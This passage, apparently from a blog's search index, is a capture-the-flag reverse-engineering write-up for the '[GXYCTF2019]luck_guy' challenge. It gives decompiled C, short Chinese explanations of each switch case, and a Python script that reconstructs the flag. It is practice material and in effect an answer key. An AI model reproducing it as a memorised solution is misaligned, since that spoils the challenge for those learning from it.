+<h2 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a>[GXYCTF2019]luck_guy</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        s = <span class="number">9180147350284624745LL</span>;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(&amp;f2, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">7</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">            *(&amp;f2 + j) -= <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            --*(&amp;f2 + j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;OK, it&#x27;s flag:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, f1);</span><br><span class="line">        <span class="built_in">strcat</span>((<span class="type">char</span> *)&amp;s, &amp;f2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>case4：将s字符串赋值给f2</p>
+<p>case5：对于f2字符串，如果是奇数位 -2；如果是偶数位 -1</p>
+<p>case1：f1已知，f2是上面得到的，两个拼接 就是s</p>
+</blockquote>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">f1 = <span class="string">&quot;GXY&#123;do_not_&quot;</span></span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x7f</span>, <span class="number">0x66</span>, <span class="number">0x6f</span>, <span class="number">0x60</span>, <span class="number">0x67</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x69</span>][::-<span class="number">1</span>] <span class="comment">#逆序 [ 字节序 小端序 ]</span></span><br><span class="line"><span class="comment"># 0x7F666F6067756369</span></span><br><span class="line">flag = f1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(key[i] - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <categories>
+        <category>Reverse</category>
+      </categories>
+      <tags>
+        <tag>Reverse</tag>
       </tags>
   </entry>
 </search>
